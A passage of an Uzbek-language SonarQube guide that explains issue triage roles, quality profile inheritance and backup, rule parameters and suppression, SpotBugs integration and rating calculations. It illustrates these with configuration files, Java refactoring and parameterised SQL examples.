```properties
# sonar-project.properties: manba va test aniq ajratilgan
sonar.projectKey=tolov-servis
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes
# JaCoCo 0.8.x xml hisoboti bo'lmasa coverage 0 ko'rinadi
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
# generatsiya qilingan kod analizga kirmaydi
sonar.exclusions=**/generated/**,**/*MapperImpl.java,**/dto/**Builder.java
# DTO lardagi coverage talabini yumshatish uchun alohida ro'yxat
sonar.coverage.exclusions=**/config/**,**/*Application.java
```

### 3.9 Issue ga oid qarorni kim qabul qiladi va uni qanday hujjatlashtirish

Qarorni kim qabul qilishi huquq modeli bilan boshqariladi. SonarQube da issue ni false positive yoki accepted holatiga o'tkazish uchun "Administer Issues" huquqi kerak. Hotspot ni safe yoki acknowledged deb belgilash uchun "Administer Security Hotspots" huquqi kerak. Oddiy developer da faqat issue ni o'ziga biriktirish va izoh yozish huquqi bo'lishi yetarli.

Amaliy taqsimot shunday bo'lgani ma'qul. Bug va code smell bo'yicha false positive qarorini jamoaning tech lead i qabul qiladi. Vulnerability va security hotspot bo'yicha qarorni xavfsizlik bilan shug'ullanadigan odam yoki security champion qabul qiladi. Bu ikki rolni ajratish muhim, chunki developer o'z kodidagi zaiflikni "safe" deb belgilashga tabiiy moyil bo'ladi.

Hujjatlashtirishning uch qatlami foydali. Birinchisi Sonar ichidagi izoh: nega shunday qaror qilinganini bir-ikki gapda yozish va tegishli ticket yoki ADR ga havola berish. Ikkinchisi kod ichidagi izoh, agar qaror o'qiyotgan odamni chalkashtirishi mumkin bo'lsa. Uchinchisi arxitektura qarori yozuvi, agar qaror bitta joyga emas, butun yondashuvga tegishli bo'lsa.

Kodda bostirish usuli ham bor, lekin u oxirgi chora. `@SuppressWarnings("java:S2245")` ko'rinishidagi annotatsiya qoidani shu joyda o'chiradi va bu o'zgarish kod bilan birga review ga tushadi, bu afzallik. Kamchiligi shu: u Sonar hisobotida ko'rinmaydi, demak qaror nazoratdan chiqadi. Shuning uchun qoidani keng ko'lamda shovqinli deb hisoblasangiz, uni quality profile dan olib tashlash va sababni jamoa hujjatiga yozish to'g'riroq.

```xml
<!-- pom.xml: scanner va coverage bog'lanishi -->
<properties>
  <sonar.organization>ichki</sonar.organization>
  <!-- qoidani kodda bostirish uchun annotatsiya ishlatiladi,
       bu yerda faqat analiz sozlamalari turadi -->
</properties>
<build>
  <plugins>
    <plugin>
      <groupId>org.jacoco</groupId>
      <artifactId>jacoco-maven-plugin</artifactId>
      <version>0.8.12</version>
      <executions>
        <execution><goals><goal>prepare-agent</goal></goals></execution>
        <execution><id>hisobot</id><phase>verify</phase>
          <goals><goal>report</goal></goals></execution>
      </executions>
    </plugin>
    <plugin>
      <groupId>org.sonarsource.scanner.maven</groupId>
      <artifactId>sonar-maven-plugin</artifactId>
      <version>4.0.0.4121</version>
    </plugin>
  </plugins>
</build>
```

### 3.10 Bir xil muammoning bir nechta qoida bilan belgilanishi va uni tartibga solish

Bitta kod qatori bir vaqtda uch-to'rt qoidani ishga tushirishi odatiy hol. Masalan satr sifatida qurilgan SQL so'rovi: `java:S2077` hotspot sifatida gapiradi, injection taint yo'li topilsa vulnerability qo'shiladi, satr konkatenatsiyasi tsikl ichida bo'lsa alohida performance smell chiqadi, bir xil satr bir necha joyda takrorlansa `java:S1192` ham qo'shiladi. Natijada panelda to'rt issue, ildiz esa bitta.

Bu holatni tartibga solishning ketma-ketligi quyidagicha. Avval eng yuqori ta'sirli topilmani oling, odatda bu vulnerability yoki blocker darajadagi reliability muammosi. Ildizni tuzating. Keyin qayta analiz qiling. Ko'p holatda qolgan issue lar o'z-o'zidan resolved bo'ladi, chunki ularning manbasi yo'qoldi. Faqat shundan keyin qolganini alohida ko'rib chiqing.

```sql
-- Oldin: so'rov kodda satr sifatida qurilgan, bir nechta qoida ishga tushadi
-- SELECT * FROM tolov WHERE filial = '" + filial + "' AND sana > '" + sana + "'

-- Keyin: nomli parametrli so'rov, repozitoriyda bitta joyda saqlanadi
SELECT t.id, t.summa, t.valyuta, t.sana
FROM tolov t
WHERE t.filial = :filial
  AND t.sana >= :boshlanish
  AND t.holat = 'TASDIQLANGAN'
ORDER BY t.sana DESC
LIMIT :chegara;
```

Teskari tartibda ishlash ko'p vaqt yo'qotadi. Agar avval `java:S1192` ni tuzatish uchun satrni konstantaga chiqarsangiz, injection muammosi joyida qoladi va yana qaytib kelishga to'g'ri keladi.

Yana bir foydali amaliyot: takrorlanadigan guruhlarni qoida bo'yicha emas, fayl bo'yicha saralash. Bir faylda sakkiz issue bo'lsa, ehtimol u faylning dizaynida muammo bor va uni bo'lib tashlash hamma issue ni birdan yopadi. Sonar ning issue ro'yxatini component bo'yicha guruhlash aynan shu ish uchun. Agar ildiz dizaynda bo'lsa, tegishli yondashuvni dizayn pattern katalogidagi mos bo'limdan tanlash foydali.

Oxirgi ogohlantirish. Issue sonini kamaytirish o'z-o'zida maqsad emas. Agar jamoa ko'rsatkichi "issue nol bo'lsin" bo'lsa, eng oson yo'l qoidalarni o'chirish va hammasini accepted deb belgilash bo'ladi. Shuning uchun o'lchov sifatida yangi kod bo'yicha gate holatini va hotspot review foizini olish kerak, umumiy issue sonini emas.

### 3.11 Amalda qo'llash

- [ ] Loyihangizdagi barcha ochiq issue larni web API orqali tur va severity bo'yicha ro'yxatlang, yangi kodda qolganlarini alohida ajratib oling.
- [ ] `sonar.qualitygate.wait=true` CI da yoqilganini va gate qizil bo'lganda build chindan to'xtayotganini bitta ataylab buzilgan commit bilan tekshiring.
- [ ] False positive yoki accepted deb belgilangan barcha issue larni ko'rib chiqing: izohi yo'qlarini topib, har biriga sabab va havola yozing yoki holatini qaytaring.
- [ ] Security hotspot larni review qiling va har biriga safe yoki acknowledged qarorini sabab bilan qo'yib, nol "to review" holatiga keltiring.
- [ ] Issue holatini o'zgartirish huquqini cheklang: bug uchun tech lead, vulnerability va hotspot uchun security champion rolini aniq belgilang.
- [ ] Eng ko'p issue to'plangan uchta faylni toping va har birida ildiz muammoni tuzatib, qayta analizdan keyin qancha issue o'z-o'zidan yopilganini yozib oling.
- [ ] Quality profile dagi shovqinli qoidalarni aniqlang, o'chirish qaroringizni jamoa hujjatiga sabab bilan yozing va kod ichidagi bostirishlar sonini sanab chiqing.
- [ ] SonarQube versiyangizni tekshirib, yangi sifat atributlari modeli ishlatilsa, gate shartlarini shu atributlar ustida qayta yozing.

## 4. Rule, quality profile va severity (Rules, Profiles and Severity)

Sonar hech qachon "kod yomon" degan umumiy hukm chiqarmaydi. U faqat o'ziga berilgan qoidalar ro'yxatini bajaradi, va bu ro'yxat quality profile deb ataladi. Shuning uchun bitta kodni ikki xil profil bilan tekshirsangiz, natija ham ikki xil chiqadi. Bu bobda qoida nima, profil qanday boshqariladi, qoidani o'chirish qachon mantiqiy qaror va qachon o'zini aldash ekanini ko'rib chiqamiz.

### 4.1 Qoida nima: tavsif, misol, tuzatish yo'li, kalit

Qoida bu kod ustidagi bitta aniq tekshiruv. Har bir qoidaning kaliti bor va u `til:Sraqam` ko'rinishida yoziladi, masalan `java:S1192`. Kalit o'zgarmaydi, qoida nomi esa versiyadan versiyaga tahrirlanishi mumkin, shuning uchun jamoa yozishmalarida har doim kalitga tayanish kerak. Sonar UI da har bir qoidaning sahifasida uchta narsa bo'ladi: nega bu muammo, qanday kod buzadi va qanday kod to'g'ri.

Qoidalar bir necha turga bo'linadi. Bug turi ishlashda xato beradigan kodni ko'rsatadi. Vulnerability xavfsizlik teshigi. Security hotspot esa avtomatik hukm emas, inson ko'rib chiqishi kerak bo'lgan joy. Code smell ishlaydi, lekin keyinchalik qimmatga tushadigan kod. 2025 LTA liniyasida bu turlar yonida "clean code attribute" va software quality bo'yicha tasnif ham chiqadi, lekin ostidagi tekshiruv mantiqi o'sha qoidaning o'zi bo'lib qoladi.

Eng ko'p uchraydigan misol cognitive complexity. `java:S3776` metod ichidagi shart va tsikl shoxlarini sanaydi, standart chegara 15. Quyida ombor qoldig'ini tekshiruvchi metod shu chegaradan oshadi.

```java
// Sonar shikoyati: java:S3776, cognitive complexity chegaradan oshdi
public String reserve(Order order) {
    if (order != null) {
        if (order.getItems() != null) {
            for (OrderItem item : order.getItems()) {
                if (item.getQty() > 0) {
                    Stock stock = stockRepo.find(item.getSku());
                    if (stock != null) {
                        if (stock.getQty() >= item.getQty()) {
                            stock.setQty(stock.getQty() - item.getQty());
                        } else {
                            return "YETMAYDI";
                        }
                    } else {
                        return "TOPILMADI";
                    }
                }
            }
        }
    }
    return "OK";
}
```

Tuzatish yo'li chegarani ko'tarish emas, shoxlarni kamaytirish. Tekshiruvlarni alohida metodga chiqarsak, murakkablik har bir metodda chegaradan past bo'ladi va test yozish ham osonlashadi.

```java
// Sonar o'tadigan variant: har bir metodda bitta mas'uliyat
public ReservationResult reserve(Order order) {
    for (OrderItem item : order.items()) {
        ReservationResult result = reserveOne(item);
        if (result.failed()) {
            return result; // birinchi xatoda to'xtaymiz
        }
    }
    return ReservationResult.ok();
}

private ReservationResult reserveOne(OrderItem item) {
    Stock stock = stockRepo.findBySku(item.sku())
            .orElseThrow(() -> new SkuNotFoundException(item.sku()));
    if (stock.qty() < item.qty()) {
        return ReservationResult.insufficient(item.sku());
    }
    stock.decrease(item.qty());
    return ReservationResult.ok();
}
```

Qoidalar faqat Java uchun emas. SQL, XML, YAML va Dockerfile uchun ham o'z qoida to'plami bor. Masalan hisobot so'rovida ustunlarni aniq sanab chiqish qoidasi migratsiyadan keyin kutilmagan natijadan saqlaydi.

```sql
-- Sonar shikoyati: ustunlar aniq sanalmagan, jadval o'zgarsa kod buziladi
SELECT * FROM payments WHERE status = 'PENDING';

-- Sonar o'tadigan variant: aniq ustunlar va aniq tartib
SELECT p.id, p.order_id, p.amount, p.currency, p.created_at
FROM payments p
WHERE p.status = 'PENDING'
ORDER BY p.created_at;
```

### 4.2 Standart profil (Sonar way) va u nimani o'z ichiga oladi

Har bir til uchun Sonar o'zining "Sonar way" profilini beradi va yangi loyiha avtomatik shu profilga ulanadi. Bu profil ichidagi qoidalar tanlangan mezon bilan tanlangan: false positive ehtimoli past, muammosi tushunarli, tuzatish yo'li aniq. Java uchun Sonar way da minglab mavjud qoidadan taxminan yarmidan kamrog'i yoqilgan bo'ladi, aniq son versiyaga qarab farq qiladi.

Sonar way ichida nima bor va nima yo'q ekanini tushunish muhim. Ichida: null dereference, resurs yopilmaganligi, bo'sh catch bloki, takrorlangan string literal, dead code, murakkablik chegaralari, keng tarqalgan xavfsizlik naqshlari. Ichida yo'q: ko'p stilistik talablar, qattiq nomlash konvensiyalari, kontekstga juda bog'liq arxitektura qoidalari. Stil masalasini Sonar emas, formatter hal qilishi kerak.

Yana bir "Sonar way Recommended" nomli variant ham uchraydi, unda qo'shimcha qoidalar bor. Ikkala standart profil ham read-only, ya'ni ularni tahrirlay olmaysiz. O'zgartirish uchun nasl olish kerak.

### 4.3 O'z profilingizni yaratish: nasl olish, qoida qo'shish va o'chirish

Jarayon oddiy: Quality Profiles sahifasida Sonar way ni tanlaysiz, Copy yoki Extend qilasiz, keyin o'z profilingizda qoidalarni sozlaysiz. Copy va Extend o'rtasidagi farq muhim. Copy nusxa oladi va keyin ota profil yangilansa, sizga hech narsa o'tmaydi. Extend esa nasl bog'lanishini saqlaydi: ota profilga yangi qoida qo'shilsa, u sizning profilingizda ham paydo bo'ladi.

Amalda tavsiya: Extend tanlang. Shunda Sonar jamoasi yangi foydali qoida qo'shganda siz uni bepul olasiz, o'zingizning farqlaringiz esa alohida qatlamda qoladi. Nasl olingan profilda ota qoidasini o'chira olmaysiz, faqat o'zingiz qo'shganini boshqarasiz. Agar otaning bitta qoidasi sizga umuman mos kelmasa, o'sha holatda Copy yoki qoida darajasida boshqa yechim kerak bo'ladi.

Profilni qo'lda sozlashning xavfi shuki, u serverda yashaydi va git da izi qolmaydi. Shuning uchun profilni backup qilib repoda saqlash kerak. Web API buni oson qiladi.

```bash
# Profilni XML ga eksport qilish va repoda saqlash
SONAR_URL="https://sonar.example.com"
curl -sS -u "$SONAR_TOKEN:" \
  "$SONAR_URL/api/qualityprofiles/backup?language=java&qualityProfile=Payments%20Java" \
  -o quality/payments-java-profile.xml

# Yoqilgan qoidalar sonini tekshirish (git diff da ko'rinadi)
grep -c "<rule>" quality/payments-java-profile.xml

# Boshqa muhitga tiklash
curl -sS -u "$SONAR_TOKEN:" -X POST \
  -F "backup=@quality/payments-java-profile.xml" \
  "$SONAR_URL/api/qualityprofiles/restore"
```

Bu bitta harakat profilni "serverdagi sirli sozlama" dan "code review dan o'tadigan fayl" ga aylantiradi. Profilni kim, qachon va nega o'zgartirganini pull request tarixidan ko'rasiz.

### 4.4 Qoidani o'chirish qachon to'g'ri qaror, qachon o'zini aldash

Bu bobning eng muhim qismi. Qoidani o'chirish o'zi yomon emas, lekin sabab muhim. To'g'ri sabab: qoida sizning texnologiyangizda haqiqatan ham noto'g'ri ishlaydi. Noto'g'ri sabab: qoida ko'p issue chiqardi va biz tuzatishni xohlamaymiz.

| Holat | Qoidani o'chirish o'rinli | Qoidani o'chirish o'rinsiz |
| --- | --- | --- |
| Qoida framework naqshini tushunmaydi | Lombok yoki MapStruct generatsiyasi noto'g'ri belgilansa | Lombok ishlatmasdan shunchaki getter yozishni xohlamasangiz |
| Issue soni juda ko'p | Qoida butun loyihada 100% false positive bo'lsa | Qoida haqiqiy qarzni ko'rsatsa, raqam esa noqulay bo'lsa |
| Test kodi | Test uchun mos kelmaydigan qoidani faqat test papkasida o'chirish | Testlardagi assertion yo'qligini aytuvchi qoidani o'chirish |
| Chegara qoidalari | Generatsiya qilingan kod uchun chegarani istisno qilish | Metod murakkabligini 15 dan 60 ga ko'tarish |
| Xavfsizlik | Boshqa qatlamda himoya borligi hujjatlashtirilgan bo'lsa | "Bizning ichki tizim, hujum bo'lmaydi" deganda |
| Deprecated API | Migratsiya rejasi va muddati yozilgan bo'lsa | Migratsiya hech qachon boshlanmasa |
| Legacy modul | Modul o'chirilish rejasida va faqat o'sha modulda | Butun monolitda global o'chirish |
| Quality gate qizil | Hech qachon: gate shartini ko'rib chiqish kerak | Gate o'tishi uchun qoidani o'chirish |

Uchinchi yo'l ham bor va u ko'pincha eng to'g'risi: qoidani o'chirmasdan, aniq bitta joyda istisno qilish. Java da bu `@SuppressWarnings` izohi, va unda sabab yozilishi shart.

```java
@Service
public class LegacyPaymentGateway {

    // Qoida global o'chirilmadi, faqat shu metodda istisno qilindi.
    // Sabab: tashqi SOAP client o'zini yopadi, biz yopsak session uziladi.
    // Jira: PAY-4412, 2026 Q1 da yangi REST client ga o'tamiz.
    @SuppressWarnings("java:S2095")
    public PaymentStatus charge(ChargeCommand command) {
        GatewaySession session = vendorClient.openSession();
        return session.charge(command.amount(), command.currency());
    }
}
```

Bu yondashuvning afzalligi: istisno kodning yonida turadi, sababi o'qiladi, va grep bilan hamma istisnoni bir ko'rishda sanab chiqasiz. Serverda "Won't fix" bosish esa koddan ko'rinmaydi va yangi developer hech narsa bilmaydi.

### 4.5 Qoida parametrlari: chegaralarni loyihaga moslash

Ko'p qoidaning parametri bor va bu o'chirishdan ancha yumshoq vosita. `java:S3776` da murakkablik chegarasi, `java:S1192` da bir xil string necha marta takrorlanishi, metod parametrlari sonini cheklovchi qoidada maksimal son. Parametr nomlari versiyaga qarab farq qiladi, shuning uchun aniq nomni UI dan yoki eksport qilingan XML dan oling.

Parametrni o'zgartirishda bitta qoida bor: chegarani kod darajasiga emas, jamoa kelishgan maqsadga qarab qo'ying. Agar kodda murakkablik 40 bo'lsa va siz chegarani 40 qilsangiz, qoida o'lgan bo'ladi. To'g'ri yo'l: chegarani 15 da qoldirib, yangi kodga qo'llash, eski kodni asta tuzatish. Sonar ning "new code" mantiqi aynan shu uchun bor.

```xml
<!-- quality/payments-java-profile.xml, parametr bilan qoida -->
<profile>
  <name>Payments Java</name>
  <language>java</language>
  <rules>
    <rule>
      <repositoryKey>java</repositoryKey>
      <key>S3776</key>
      <priority>CRITICAL</priority>
      <parameters>
        <!-- standart 15, biz 12 ga tushirdik: domen kodi sodda bo'lishi kerak -->
        <parameter>
          <key>Threshold</key>
          <value>12</value>
        </parameter>
      </parameters>
    </rule>
  </rules>
</profile>
```

Severity ham xuddi parametr kabi profil ichida o'zgaradi. Bu muhim, chunki quality gate sharti ko'pincha severity ga bog'lanadi. Agar gate "Blocker va Critical issue bo'lmasin" desa, siz bitta qoidaning severity sini Major dan Critical ga ko'tarib, uni amalda majburiy qilib qo'yasiz. Teskari harakat ham ishlaydi va aynan shu joyda o'zini aldash boshlanadi: severity ni Info ga tushirish qoidani o'chirishning yashirin shakli.

| Tuzoq | Nima bo'ladi | Yechim |
| --- | --- | --- |
| Chegarani kodga moslash | Qoida hech qachon ishga tushmaydi | Chegarani qoldirib, new code shartini ishlatish |
| Severity ni Info ga tushirish | Gate o'tadi, muammo qoladi | Severity ni saqlab, issue ni rejaga kiritish |
| Profilni faqat UI da sozlash | O'zgarish tarixi yo'q, audit yo'q | Profilni XML backup bilan repoda saqlash |
| Copy bilan nasl uzish | Yangi qoidalar hech qachon kelmaydi | Extend ishlatish |
| Global `@SuppressWarnings` | Butun sinf nazoratdan chiqadi | Istisno aniq metodda va sabab bilan |
| Tashqi report ulanmagan | SpotBugs natijasi Sonar da ko'rinmaydi | Report yo'lini `sonar.java.*ReportPaths` ga berish |
| Har modulda boshqa profil | Natijalarni solishtirib bo'lmaydi | Tashkilot darajasida bitta asos profil |
| Test papkasi ajratilmagan | Test kodi domen qoidalari bilan tekshiriladi | `sonar.tests` ni aniq ko'rsatish |

### 4.6 Profil tayinlash: til bo'yicha, loyiha bo'yicha, tashkilot bo'yicha

Profil har doim bitta tilga tegishli. Ya'ni bitta loyihada Java, XML va YAML uchun uchta alohida profil faol bo'ladi. Shuning uchun "loyihaning profili" degan narsa yo'q, "loyihaning har bir til uchun profili" bor.

Tayinlashning uch darajasi mavjud. Birinchisi default: har bir til uchun bitta profil default deb belgilanadi va yangi loyihalar shuni oladi. Ikkinchisi loyiha darajasi: aniq bitta loyihaga boshqa profil biriktirasiz. Uchinchisi tashkilot amaliyoti: default ni o'z korporativ profilingizga almashtirasiz va shundan keyin barcha yangi loyihalar avtomatik to'g'ri profilni oladi.

Amalda eng barqaror sxema ikki qatlamli: tashkilot bo'ylab bitta "Company Java" profili Sonar way dan nasl oladi, va faqat juda alohida loyihalar undan nasl olgan o'z profilini qiladi. Uchdan ko'p qatlam qilsangiz, qaysi qoida qaysi profildan kelganini hech kim tushunmay qoladi.

Diqqat qiling: profilni skaner tomonidan, ya'ni `sonar-project.properties` ichidan tanlay olmaysiz. Bu ataylab shunday, chunki aks holda har bir developer o'z mashinasida qoidalarni yumshatib yuborishi mumkin edi. Profil faqat serverda, ruxsati bor odam tomonidan tayinlanadi.

### 4.7 Profil o'zgarishi va uning eski natijalarga ta'siri

Bu joy ko'p chalkashlik keltiradi, shuning uchun aniq aytamiz. Profilni o'zgartirganingizda Sonar eski analiz natijalarini qayta hisoblamaydi. Yangi qoida faqat keyingi analizdan boshlab issue chiqaradi. Shuning uchun profil o'zgargandan keyin darhol bitta analiz ishga tushirmaguningizcha, dashboard eski manzarani ko'rsatib turadi.

Ikkinchi nozik nuqta: yangi qoida yoqilsa, u eski kodda ham issue topadi. Agar quality gate sharti faqat new code ga qarasa, bu issue lar gate ni buzmaydi va ro'yxatda texnik qarz sifatida turadi. Agar gate overall code ga qarasa, bitta profil o'zgarishi ertasi kuni butun pipeline ni qizartirib qo'yishi mumkin. Shuning uchun profilga yangi qoida qo'shishni relizdan oldingi kunga qo'ymang.

Uchinchisi: qoidani o'chirsangiz, undan kelgan issue lar yopiladi va "closed" holatga o'tadi. Keyin o'sha qoidani qaytarsangiz, issue lar yangi deb hisoblanishi mumkin, ya'ni ularning "created" sanasi o'zgarib, new code oynasiga tushib qolishi mumkin. Buni tekshirmasdan katta profil o'zgarishini relizga olib bormang.

Xavfsiz tartib: profilni staging Sonar serverida yoki alohida loyiha kaliti bilan sinab ko'rish, natijadagi issue sonini solishtirish, keyin asosiy serverga restore qilish.

```properties
# sonar-project.properties: profil o'zgarishini sinash uchun vaqtincha loyiha kaliti
sonar.projectKey=payments-service-profile-trial
sonar.projectName=Payments Service (profil sinovi)
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes
# Sinov loyihasi gate ni buzmasligi uchun alohida gate biriktirilgan
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
# Generatsiya qilingan kodni tahlildan chiqaramiz
sonar.exclusions=**/generated/**,**/*MapperImpl.java
```

### 4.8 Tashqi vositalar qoidalari: SpotBugs, PMD, Checkstyle bilan birga ishlash

Sonar o'zining Java analizatoriga ega va u ko'p narsani qoplaydi. Shunga qaramay SpotBugs ba'zi bytecode darajasidagi muammolarni yaxshi topadi, Checkstyle esa stilistik talablarni qattiq ushlaydi. Ikki yo'l bor: bu vositalarning natijasini Sonar ga import qilish, yoki ularni mustaqil ravishda build da ishlatish.

Import qilsangiz, natija Sonar da issue sifatida ko'rinadi va quality gate ga ta'sir qiladi. Buning uchun report fayl yo'lini skanerga berish kerak.

```xml
<build>
  <plugins>
    <plugin>
      <groupId>com.github.spotbugs</groupId>
      <artifactId>spotbugs-maven-plugin</artifactId>
      <configuration>
        <!-- Sonar o'qiy oladigan XML report -->
        <xmlOutput>true</xmlOutput>
        <xmlOutputDirectory>${project.build.directory}/spotbugs</xmlOutputDirectory>
        <!-- build ni to'xtatmaydi, hukm Sonar gate da chiqadi -->
        <failOnError>false</failOnError>
      </configuration>
      <executions>
        <execution>
          <phase>verify</phase>
          <goals><goal>spotbugs</goal></goals>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>
```

Report yo'llari `sonar.java.spotbugs.reportPaths`, `sonar.java.pmd.reportPaths` va `sonar.java.checkstyle.reportPaths` kabi parametrlar bilan beriladi. Aniq nom SonarQube versiyasiga qarab farq qiladi, shuning uchun o'z versiyangizning hujjatidan tasdiqlang. Import qilingan qoidalar alohida repository ga tushadi va ularning kaliti `squid` yoki `java` emas, o'sha vositaning kaliti bo'ladi.

Eng katta xato ikki vositani bir xil narsa uchun yonma yon ishlatish. Agar SpotBugs ham, Sonar ham null dereference ni topsa, bitta muammo ikki marta sanaladi va metrikalar buziladi. To'g'ri taqsimot: Sonar asosiy analizator, SpotBugs faqat Sonar da yo'q bo'lgan tekshiruvlar uchun, Checkstyle faqat formatlash uchun va u Sonar ga import qilinmaydi.

```yaml
# .github/workflows/quality.yml, tartib muhim: verify keyin sonar
- name: Build va static analiz
  run: mvn -B clean verify   # jacoco va spotbugs report shu yerda yaratiladi

- name: Sonar analiz
  env:
    SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
  run: >
    mvn -B sonar:sonar
    -Dsonar.projectKey=payments-service
    -Dsonar.qualitygate.wait=true

- name: Profil backup o'zgarmaganini tekshirish
  run: |
    curl -sS -u "$SONAR_TOKEN:" \
      "$SONAR_HOST/api/qualityprofiles/backup?language=java&qualityProfile=Company%20Java" \
      -o /tmp/live.xml
    diff -q quality/company-java-profile.xml /tmp/live.xml \
      || echo "OGOHLANTIRISH: serverdagi profil repodagidan farq qiladi"
```

### 4.9 Qoidalar to'plamini jamoada kelishish va hujjatlashtirish

Profil texnik fayl emas, u jamoa kelishuvi. Shuning uchun uni bitta odam bir kechada o'zgartirmasligi kerak. Ishlaydigan tartib quyidagicha: har bir o'chirilgan yoki qo'shilgan qoida uchun repoda bitta qator yoziladi, unda qoida kaliti, qaror, sabab va qarorni qabul qilgan odam bo'ladi.

Bu ro'yxatni `quality/rules-decisions.md` kabi faylda saqlash kifoya. Yangi developer kelganda u "nega bu qoida o'chirilgan" savoliga javobni bir joydan topadi. Audit paytida ham xuddi shu fayl ishlaydi.

Sabab yozishda aniq bo'ling. "Bizga mos emas" sabab emas. "MapStruct generatsiya qilgan `*MapperImpl` sinflarida bu qoida 100% false positive, generatsiya shabloni o'zgarmaguncha o'chirib qo'yildi" sabab. Ikkinchi yozuvni olti oydan keyin ham qayta ko'rib chiqa olasiz.

Qoida qo'shishni ham xuddi shu tartibda qiling. Yangi qoida yoqishdan oldin uning hozirgi kodda qancha issue topishini bilib oling. Agar 400 ta chiqsa, qoidani darhol Blocker qilib qo'yish o'rniga, uni yoqib, gate ni faqat new code ga bog'lab qo'ying. Shunda yangi kod toza bo'ladi, eski kod esa reja bilan tozalanadi. Quality gate va new code mexanikasi haqida shu hujjatning quality gate bobida batafsil yozilgan.

### 4.10 Profil versiyasini kuzatish va yangi qoidalar kelganda nima qilish

SonarQube yangilanganda analizator pluginlari ham yangilanadi va Sonar way ga yangi qoidalar qo'shiladi. Agar siz Extend qilgan bo'lsangiz, bu qoidalar sizga avtomatik keladi. Bu yaxshi, lekin kutilmagan bo'lsa yoqimsiz: ertalab pipeline qizil bo'lib turadi.

Shuning uchun yangilanishni jarayon sifatida rasmiylashtirish kerak. Avval staging serverda yangilang. Keyin bir necha vakil loyihani qayta analiz qiling va yangi issue larni ko'rib chiqing. Yangi qoidalardan qaysi biri haqiqiy muammo topganini va qaysi biri shovqin ekanini belgilang. Shovqin bo'lganini o'z profilingizda o'chirib, sababini hujjatga yozing. Shundan keyin prod serverni yangilang.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Profil tanlash | Sonar way ni o'zi yetadi | Sonar way dan Extend qilib korporativ asos profil yaratiladi |
| Profilni saqlash | Serverda UI orqali sozlanadi | XML backup repoda, o'zgarish pull request orqali |
| Qoida yoqmasa | Qoida o'chiriladi | Avval false positive tekshiriladi, keyin parametr, oxirida o'chirish |
| Istisno berish | Serverda "Won't fix" bosiladi | Kodda `@SuppressWarnings` va sabab izohi |
| Chegaralar | Kodga moslab ko'tariladi | Standart saqlanadi, new code shartiga tayaniladi |
| Severity | Gate o'tishi uchun tushiriladi | Severity haqiqiy ta'sirni aks ettiradi |
| Tashqi vositalar | SpotBugs va Sonar ikkisi ham hammasini tekshiradi | Mas'uliyat taqsimlangan, takrorlanish yo'q |
| Yangilanish | Prod da to'g'ridan to'g'ri yangilanadi | Staging da sinaladi, yangi qoidalar baholanadi |
| Qarorlar tarixi | Odamlar xotirasida | `rules-decisions.md` faylida kalit, sabab va muallif bilan |
| Profil soni | Har jamoa o'zini qiladi | Ikki qatlam: tashkilot asosi va zarur istisnolar |

Oxirgi maslahat: profilni kichik tuting. 600 ta yoqilgan qoida 200 tasidan yaxshi degani emas. Jamoa tushunadigan, sababi hujjatlashtirilgan va haqiqatan ham tuzatiladigan qoidalar to'plami eng foydali profil bo'ladi.

### 4.11 Amalda qo'llash

- [ ] Hozirgi loyihangizda har bir til uchun qaysi profil faol ekanini Sonar UI dan aniqlang va ro'yxat tuzing.
- [ ] Sonar way dan Extend qilib bitta korporativ `Company Java` profilini yarating, Copy ishlatmang.
- [ ] `api/qualityprofiles/backup` orqali profil XML ini eksport qilib, uni `quality/` papkasida git ga qo'shing.
- [ ] `quality/rules-decisions.md` fayl yaratib, har bir o'chirilgan qoida uchun kalit, sabab, muallif va qayta ko'rish sanasini yozing.
- [ ] Serverdagi "Won't fix" va "False positive" belgilarini ko'rib chiqing, mos keladiganlarini koddagi `@SuppressWarnings` va izohga o'tkazing.
- [ ] `java:S3776` chegarasini loyihangizda sinab ko'ring: standart 15 da qoldirib, yangi kodda qancha issue chiqishini o'lchang.
- [ ] CI ga serverdagi profil repodagi XML dan farq qilsa ogohlantirish beradigan qadam qo'shing.
- [ ] Keyingi SonarQube yangilanishini avval staging da bajarib, yangi qoidalardan kelgan issue larni jamoa bilan bir o'tirishda baholang.

## 5. Metrikalar: rating, texnik qarz, murakkablik, takrorlanish (Metrics and Ratings)

Sonar hisobotidagi harf va foizlar sehrli emas. Ularning ortida juda oddiy arifmetika turadi: qoida topgan har bir issue ga daqiqa bahosi qo'yiladi, bahalar qo'shiladi, keyin kod hajmiga bo'linadi. Shu mexanikani bilgan developer reytingni ko'rib darhol tushunadi: bu yerda bitta blocker bugmi, yoki minglab mayda smell to'planganmi. Quyida har bir metrika qanday hisoblanadi, qaysi biriga qaror uchun tayanish mumkin va qaysi biri faqat tekshirishga chaqiruvchi signal ekani ko'rsatiladi.

### 5.1 Reliability, security va maintainability reytinglari qanday hisoblanadi

Uchta reyting uchta butunlay boshqa mantiq ishlatadi, va buni aralashtirish eng keng tarqalgan xato. Reliability va security reytingi eng og'ir bitta issue bo'yicha aniqlanadi: minglab mayda bug A dan C ga tushirmaydi, lekin bitta blocker bug darhol E beradi. Maintainability reytingi esa aksincha, jamlanma: u texnik qarzning kod hajmiga nisbatidan chiqadi, shuning uchun bitta smell hech narsani o'zgartirmaydi, minglab smell esa harfni pastga suradi.

Shuning uchun reliability E ni tuzatish uchun bitta joyni tuzatish kifoya qiladi, maintainability D ni tuzatish esa oylik ish bo'lishi mumkin. Security review reytingi to'rtinchi, alohida o'lchov: u security hotspot larning qanchasini odam ko'rib chiqqaniga qaraydi, ya'ni kod sifatini emas, jarayon bajarilganini o'lchaydi.

| Reyting | Reliability va security sharti | Maintainability sharti (debt ratio) | Security review sharti (ko'rilgan hotspot) |
|---|---|---|---|
| A | bironta bug yoki vulnerability yo'q | 5% va undan kam | 80% va undan ko'p |
| B | kamida bitta past ta'sirli issue bor | 6% dan 10% gacha | 70% dan 80% gacha |
| C | kamida bitta o'rta ta'sirli issue bor | 11% dan 20% gacha | 50% dan 70% gacha |
| D | kamida bitta yuqori ta'sirli issue bor | 21% dan 50% gacha | 30% dan 50% gacha |
